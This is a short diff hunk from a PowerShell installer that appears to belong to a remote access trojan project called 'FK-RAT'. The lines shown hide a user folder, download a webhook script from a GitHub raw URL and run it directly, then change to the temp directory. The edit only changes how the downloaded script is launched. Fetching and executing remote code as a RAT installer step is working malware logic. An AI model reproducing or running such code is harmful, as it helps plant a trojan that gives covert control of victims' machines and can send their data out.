@@ -47,7 +47,7 @@ Get-Item "C:\Users\$uName" -Force | ForEach-Object {$_.Attributes = $_.Attribute
 
 ## get webhook
 Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/webhook.ps1 -OutFile webhook.ps1
-Start-Process .\webhook.ps1 $webhook
+.\webhook.ps1 $webhook
 
 ## goto Temp and make dir 
 Set-Location $temp	
